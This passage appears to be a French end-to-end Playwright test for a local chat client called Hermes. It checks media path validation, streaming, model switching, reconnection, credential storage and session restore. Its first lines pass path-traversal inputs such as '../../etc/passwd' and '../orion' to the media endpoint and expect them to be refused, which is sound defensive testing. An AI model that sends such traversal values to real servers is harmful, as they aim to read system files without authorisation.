    [{ profile: 'orion', path: '/Users/test/../../etc/passwd.png' }, 400],
    [{ profile: 'orion', path: 'relatif/slide.png' }, 400],
    [{ profile: 'orion', path: '/Users/test/visuels.png/' }, 400],
    [{ profile: 'orion', path: '//hote/partage/slide.png' }, 400],
    [{ profile: 'orion', path: '/Users/./test/slide.png' }, 400],
    [{ profile: '../orion', path: '/Users/test/videos/video.mp4' }, 400],
    [{ profile: 'orion', path: '/Users/test/visuels/absent.jpg' }, 404],
  ]) {
    const result = await media(query)
    await result.arrayBuffer()
    if (result.status !== status) throw new Error(`/api/media ${JSON.stringify(query)} : HTTP ${result.status} au lieu de ${status}`)
  }
  const partial = await media({ profile: 'orion', path: '/Users/test/videos/video.mp4' }, { Range: 'bytes=0-99' })
  const partialBytes = (await partial.arrayBuffer()).byteLength
  if (partial.status !== 206 || partial.headers.get('content-range') !== `bytes 0-99/${VIDEO_SIZE}` || partialBytes !== 100) {
    throw new Error(`Range vidéo mal relayé : ${partial.status} ${partial.headers.get('content-range')} ${partialBytes} octets`)
  }
  const image = await media({ profile: 'orion', path: '/Users/test/visuels/slide-02.png' })
  await image.arrayBuffer()
  if (image.status !== 200 || image.headers.get('content-type') !== 'image/png'
    || /attachment/i.test(image.headers.get('content-disposition') || '')
    || !/sandbox/.test(image.headers.get('content-security-policy') || '')
    || image.headers.get('x-content-type-options') !== 'nosniff') throw new Error('En-têtes de l’image relayée incorrects.')
  await page.getByRole('tab', { name: /Activité/ }).click()
  // L’historique et « Test silence » : deux silences, tous deux rangés dans Activité.
  await page.locator('.activity-row').getByText('NOREPLY').first().waitFor()
  await page.getByRole('tab', { name: /Routines/ }).click()
  await page.getByRole('textbox', { name: 'Message à Orion' }).fill('Test de streaming')
  await page.getByRole('textbox', { name: 'Message à Orion' }).press('Enter')
  try {
    await page.locator('.message-assistant').getByText('Réponse Hermes simulée.').waitFor({ timeout: 10_000 })
  } catch (error) {
    console.log('chat au moment de l’échec:', await page.locator('.messages-column').innerText())
    console.log('notice:', await page.locator('.toast').allTextContents())
    throw error
  }
  await page.locator('.routine-row').waitFor({ timeout: 5_000 })
  const routines = await page.locator('.routine-row').count()
  if (routines !== 1) throw new Error(`Routines: ${routines} au lieu de 1`)

  const rosterCallsBeforeSwitch = profilesListCalls
  await page.locator('[data-bot=nova]').click()
  await page.locator('.message-assistant').getByText('Je suis ton bot Hermes de test.').waitFor()
  await page.locator('[data-bot=orion]').click()
  await page.locator('.message-assistant').getByText('Réponse Hermes simulée.').waitFor()
  if (profilesListCalls !== rosterCallsBeforeSwitch) throw new Error('Cache: un changement de bot a relu le roster.')

  if (await page.locator('.usage-readout').count()) throw new Error('Contexte et tok/s doivent être masqués par défaut.')
  await page.getByRole('button', { name: 'Afficher le contexte et le débit' }).click()
  await page.locator('.usage-readout').getByText('Contexte 4 % (41k/1M) · 63 tok/s').waitFor({ timeout: 5_000 })
  await page.getByRole('button', { name: 'Afficher le contexte et le débit' }).click()

  const promptsBeforeCommand = promptCalls
  await page.getByRole('textbox', { name: 'Message à Orion' }).fill('/model sonnet')
  await page.getByRole('textbox', { name: 'Message à Orion' }).press('Enter')
  await page.locator('.model-option[data-model="claude-sonnet-5-5"]').waitFor({ timeout: 5_000 })
  if (promptCalls !== promptsBeforeCommand) throw new Error('/model a été envoyé au bot.')
  if (await page.locator('.model-option[data-model="claude-opus-5-5"]').count()) throw new Error('/model sonnet ne filtre pas.')
  await page.getByRole('textbox', { name: 'Rechercher un modèle' }).fill('')
  if (await page.locator('.model-option[data-model="modele-interdit"]').count()) throw new Error('Fournisseur non connecté proposé.')
  page.once('dialog', (dialog) => dialog.accept())
  await page.locator('.model-option[data-model="claude-sonnet-5-5"]').click()
  await page.locator('.model-chip').getByText('Sonnet 5.5').waitFor({ timeout: 5_000 })
  const lastMutation = modelMutations.at(-1)
  if (modelMutations.length !== 2) throw new Error(`session.mutate: ${modelMutations.length} appels au lieu de 2`)
  if (lastMutation?.expected_revision !== 4 || lastMutation?.expected_generation !== 1) throw new Error(`Clôtures inattendues: ${JSON.stringify(lastMutation)}`)
  if (lastMutation?.payload?.model !== 'claude-sonnet-5-5' || lastMutation?.payload?.provider !== 'anthropic' || lastMutation?.payload?.confirm !== 'confirm-test') throw new Error(`Mutation inattendue: ${JSON.stringify(lastMutation)}`)
  if (!lastMutation?.request_id || lastMutation.request_id === modelMutations[0].request_id) throw new Error('La confirmation doit avoir une nouvelle request_id.')

  // Un vrai geste de l’utilisateur (molette vers le haut) décroche le fil ; un défilement programmé ne le ferait pas.
  const scrollBox = await page.locator('.messages-scroll').boundingBox()
  await page.mouse.move(scrollBox.x + scrollBox.width / 2, scrollBox.y + scrollBox.height / 2)
  await page.mouse.wheel(0, -40_000)
  await page.waitForFunction(() => document.querySelector('.messages-scroll').scrollTop < 5, null, { timeout: 5_000 })
  await delay(200)
  const scrolledTo = await page.locator('.messages-scroll').evaluate((element) => element.scrollTop)
  await page.getByRole('textbox', { name: 'Message à Orion' }).fill('Test pendant lecture')
  await page.getByRole('textbox', { name: 'Message à Orion' }).press('Enter')
  await delay(600)
  const scrollTop = await page.locator('.messages-scroll').evaluate((element) => element.scrollTop)
  if (scrollTop !== scrolledTo) throw new Error(`Le scroll a été déplacé pendant la réponse: ${scrolledTo} → ${scrollTop}`)
  await page.locator('.jump-latest').click()
  await delay(600)
  const jumpedScrollTop = await page.locator('.messages-scroll').evaluate((element) => element.scrollTop)
  if (jumpedScrollTop === 0) throw new Error('Le bouton Nouveaux messages ne descend pas.')

  // Coupure brutale de la gateway (code 1006) : le serveur doit survivre, puis l’envoi doit reprendre.
  for (const client of wss.clients) client.terminate()
  await delay(500)
  if (!(await fetch('http://127.0.0.1:4332/api/health')).ok) throw new Error('Le serveur est tombé sur une fermeture 1006.')
  const promptsBeforeReconnect = promptCalls
  await page.getByRole('textbox', { name: 'Message à Orion' }).fill('Après coupure')
  await page.getByRole('textbox', { name: 'Message à Orion' }).press('Enter')
  await page.getByText('Après coupure').first().waitFor({ timeout: 5_000 })
  for (let attempt = 0; attempt < 30 && promptCalls === promptsBeforeReconnect; attempt += 1) await delay(100)
  if (promptCalls === promptsBeforeReconnect) throw new Error('Envoi perdu après reconnexion.')
  await delay(400)

  // Bouton de reconnexion : statut visible, retour sans recharger la page, chat ouvert réabonné.
  const refresh = page.getByRole('button', { name: 'Reconnecter Hermes' })
  const connection = page.locator('.connection-label')
  for (const client of wss.clients) client.terminate()
  await connection.getByText('Hermes déconnecté').waitFor({ timeout: 5_000 })
  const resumesBeforeRefresh = sessionResumeCalls
  await refresh.click()
  await connection.getByText('Hermes connecté').waitFor({ timeout: 5_000 })
  for (let attempt = 0; attempt < 30 && sessionResumeCalls === resumesBeforeRefresh; attempt += 1) await delay(100)
  if (sessionResumeCalls === resumesBeforeRefresh) throw new Error('Le chat ouvert n’a pas été réabonné après reconnexion.')
  await refresh.click() // socket encore ouvert : doit être remplacé, pas doublé
  await delay(500)
  await connection.getByText('Hermes connecté').waitFor({ timeout: 5_000 })
  if (wss.clients.size !== 1) throw new Error(`Sockets ouverts après reconnexion : ${wss.clients.size} au lieu de 1.`)
  for (const client of wss.clients) send(client, event('chat-orion', 'message.complete', { turn_id: 'turn-retour', text: 'Reçu après reconnexion.', status: 'complete' }))
  await page.locator('.message-assistant').getByText('Reçu après reconnexion.').waitFor({ timeout: 3_000 })

  // Gateway injoignable : message clair, puis retour au clic suivant.
  forcedAuthStatus = 503
  await refresh.click()
  await page.locator('.toast').getByText('Hermes ne répond pas').waitFor({ timeout: 5_000 })
  await connection.getByText('Hermes déconnecté').waitFor({ timeout: 2_000 })
  await delay(400)
  await page.screenshot({ path: `${SCREENSHOTS}hermes-disconnected.png` })
  forcedAuthStatus = 0
  await refresh.click()
  await connection.getByText('Hermes connecté').waitFor({ timeout: 5_000 })
  if (await page.locator('.toast').count()) throw new Error('Le message d’erreur reste affiché après reconnexion.')

  // Identifiants gardés côté serveur, jamais dans le navigateur.
  if (JSON.parse(readFileSync(SAVED_LOGIN_FILE, 'utf8')).username !== 'test') throw new Error('Identifiants non enregistrés.')
  if (await page.evaluate(() => JSON.stringify({ ...localStorage, ...sessionStorage, cookie: document.cookie }).includes('"password"'))) throw new Error('Mot de passe présent dans le navigateur.')

  // Un autre processus local, même avec le bon Origin, n’obtient rien sans cookie de session.
  const loginsBeforeForged = loginCalls
  const forged = await fetch('http://127.0.0.1:4332/api/auth/restore', { method: 'POST', headers: { Origin: 'http://127.0.0.1:4332' } })
  await forged.arrayBuffer()
  if (forged.status !== 404 || forged.headers.get('set-cookie') || loginCalls !== loginsBeforeForged) throw new Error(`Restauration sans cookie acceptée : HTTP ${forged.status}.`)

  // Session Hermes expirée : reconnexion silencieuse avec les identifiants gardés.
  const loginsBeforeExpiry = loginCalls
  expiredBefore = cookieCounter
  await refresh.click()
  await delay(300)
  await connection.getByText('Hermes connecté').waitFor({ timeout: 5_000 })
  if (loginCalls !== loginsBeforeExpiry + 1) throw new Error(`Reconnexion silencieuse : ${loginCalls - loginsBeforeExpiry} connexions au lieu de 1.`)
  if (await page.locator('.login-card').count()) throw new Error('Écran de connexion affiché malgré les identifiants gardés.')

  // Mot de passe changé : identifiants oubliés, retour à l’écran, puis reprise du même bot.
  expiredBefore = cookieCounter
  loginRefused = true
  await refresh.click()
  await page.locator('.login-card').waitFor({ timeout: 5_000 })
  await page.getByText('Identifiants enregistrés refusés').waitFor({ timeout: 2_000 })
  if (existsSync(SAVED_LOGIN_FILE)) throw new Error('Des identifiants refusés doivent être oubliés.')
  loginRefused = false
  await page.getByLabel('Identifiant Hermes').fill('test')
  await page.getByLabel('Mot de passe').fill('test')
  await page.getByRole('button', { name: 'Ouvrir mes bots' }).click()
  await page.locator('[data-bot=orion].is-selected').waitFor({ timeout: 10_000 })
  await connection.getByText('Hermes connecté').waitFor({ timeout: 5_000 })
  if (await page.locator('.toast').count()) throw new Error('Le message de session expirée reste affiché après connexion.')

  // Classement : sections par groupes, liste unique par activité avec le bot le plus récent en tête.
  const rosterOrder = () => page.locator('.bot-row').evaluateAll((rows) => rows.map((row) => row.dataset.bot).join())
  await page.locator('.section-heading').first().waitFor({ timeout: 3_000 })
  if (await rosterOrder() !== 'nova,orion') throw new Error(`Ordre par groupes : ${await rosterOrder()}`)
  await page.getByRole('button', { name: 'Activité', exact: true }).click()
  await page.locator('.section-heading').first().waitFor({ state: 'detached', timeout: 3_000 })
  if (await rosterOrder() !== 'orion,nova') throw new Error(`Ordre par activité : ${await rosterOrder()}`)
  await page.getByRole('button', { name: 'Groupes', exact: true }).click()
  await page.locator('.section-heading').first().waitFor({ timeout: 3_000 })
  if (await rosterOrder() !== 'nova,orion') throw new Error(`Retour aux groupes : ${await rosterOrder()}`)

  child.kill('SIGTERM')
  await delay(300)
  child = spawn(process.execPath, ['server/index.mjs'], {
    cwd: new URL('..', import.meta.url),
    env: {
      ...process.env,
      NODE_ENV: 'development', PORT: '4332', HERMES_ORIGIN: 'http://127.0.0.1:9121',
      NODE_OPTIONS: `--require ${new URL('persistence-hook.cjs', import.meta.url).pathname}`,
      HERMESBOT_TEST_SESSION_FILE: SESSION_FILE,
    },
    stdio: ['ignore', 'pipe', 'pipe'],
  })
  for (let attempt = 0; attempt < 50; attempt += 1) {
    try { if ((await fetch('http://127.0.0.1:4332/api/health')).ok) break } catch { /* serveur pas prêt */ }
    await delay(100)
  }
  await page.reload({ waitUntil: 'domcontentloaded' })
  await page.locator('[data-bot=nova]').waitFor({ timeout: 15_000 })
  if (await page.locator('.login-card').count()) throw new Error('La session n’a pas été restaurée après redémarrage.')

  // Lancement avec une session Hermes expirée : pas d’écran de connexion.
  expiredBefore = cookieCounter
  await page.reload({ waitUntil: 'domcontentloaded' })
  await page.locator('[data-bot=nova]').waitFor({ timeout: 15_000 })
  if (await page.locator('.login-card').count()) throw new Error('Écran de connexion au lancement malgré les identifiants gardés.')

  // Se déconnecter oublie les identifiants ; une connexion sans la case n’enregistre rien.
  page.once('dialog', (dialog) => dialog.accept())
  await page.getByRole('button', { name: 'Se déconnecter' }).click()
  await page.locator('.login-card').waitFor({ timeout: 10_000 })
  if (existsSync(SAVED_LOGIN_FILE) || logoutCalls !== 1) throw new Error('La déconnexion doit oublier les identifiants.')
  await page.getByLabel('Rester connecté sur ce Mac').uncheck()
  await page.getByLabel('Identifiant Hermes').fill('test')
  await page.getByLabel('Mot de passe').fill('test')
  await page.getByRole('button', { name: 'Ouvrir mes bots' }).click()
  await page.locator('[data-bot=nova]').waitFor({ timeout: 15_000 })
  if (existsSync(SAVED_LOGIN_FILE)) throw new Error('Case décochée : rien ne doit être enregistré.')

  // Mode démo : plusieurs états à la fois (travail, terminé, attente), captures claire et sombre.
  await page.goto('http://127.0.0.1:4332/?demo=1', { waitUntil: 'domcontentloaded' })
  await page.locator('.working-strip.has-work').waitFor({ timeout: 10_000 })
  await page.locator('[data-bot=orion] .bot-row-status.is-working').waitFor()
  await page.locator('[data-bot=orion] .live-avatar.is-working').waitFor()
  await delay(900)
  await page.screenshot({ path: `${SCREENSHOTS}demo-glass-light.png` })
  await page.getByRole('button', { name: 'Activité', exact: true }).click()
  await page.locator('.section-heading').first().waitFor({ state: 'detached', timeout: 3_000 })
  await delay(300)
  await page.screenshot({ path: `${SCREENSHOTS}demo-activity.png` })
  if (await page.locator('.sidebar-filter-row').evaluate((row) => row.scrollWidth > row.clientWidth)) throw new Error('La ligne de filtres déborde de la sidebar.')
  await page.getByRole('button', { name: 'Groupes', exact: true }).click()
  await page.getByRole('button', { name: 'Passer au thème sombre' }).click()
  await delay(700)
  await page.screenshot({ path: `${SCREENSHOTS}demo-glass-dark.png` })
  await page.getByRole('button', { name: 'Passer au thème clair' }).click()

  if (errors.length) throw new Error(`Erreurs Chromium: ${errors.join(', ')}`)
  console.log('E2E OK: auth, WebSocket, roster, routines réelles, cache instantané, médias MEDIA: (galerie, vidéo Range, visionneuse, filtres, vidéo qui continue après le streaming), statut au travail et tour en arrière-plan, NOREPLY jamais affiché en streaming, /model, contexte, tok/s, envoi, streaming, scroll libre, coupure 1006 et reconnexion, bouton de reconnexion (socket unique, réabonnement, gateway injoignable, session expirée), classement par groupes ou par activité, résumé du travail sans non-lu avant la fin, coffre et accords, carte de mail, identifiants gardés.')
} finally {
  if (browser) await browser.close()
  if (child) child.kill('SIGTERM')
  wss.close()
  await new Promise((resolve) => mock.close(resolve))
}
